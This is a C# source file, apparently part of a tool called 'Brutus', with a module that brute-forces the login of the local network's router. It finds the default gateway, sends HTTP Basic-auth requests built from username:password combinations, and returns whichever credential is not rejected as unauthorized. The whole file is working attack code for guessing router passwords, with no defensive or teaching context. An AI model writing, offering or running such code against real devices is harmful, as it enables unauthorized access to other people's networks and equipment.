using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Http;
using System.Windows.Forms;

namespace Brutus.Modules
{
    /// <summary>
    /// A Module To Brute Force Router Logins
    /// </summary>
    internal class Router
    {
        internal static string GATEWAY = NetworkInterface.GetAllNetworkInterfaces()[0].GetIPProperties().GatewayAddresses[1].Address.MapToIPv4().ToString();
        private static HttpClient http = new HttpClient();
        private static System.Net.Http.Headers.HttpResponseHeaders HEADER { get; set; }
        internal static string SendLogin(string userpass)
        {
            if (HEADER == null) { CaptureReponseHeader(); }
            string[] combo = userpass.Split(':');
            var auth = System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("ISO-8859-1").GetBytes(combo[0] + ":" + combo[1]));
            HttpRequestMessage message = new HttpRequestMessage(new HttpMethod("GET"), "http://" + GATEWAY);
            HEADER.ToList().ForEach(x => {
                message.Headers.Add(x.Key, x.Value);
            });
            message.Headers.Add("Authorization", "Basic " + auth);
            var response = http.SendAsync(message);
            
            if (response.Result.StatusCode != HttpStatusCode.Unauthorized)
            {
                HEADER = null;
                return Encoding.Default.GetString(Convert.FromBase64String(auth));
            }
            

            return null;
        }

        private static void CaptureReponseHeader()
        {
            HttpRequestMessage ProbeMsg = new HttpRequestMessage(new HttpMethod("GET"), "http://" + GATEWAY);
            HEADER = http.SendAsync(ProbeMsg).Result.Headers;      
        }
    }
}
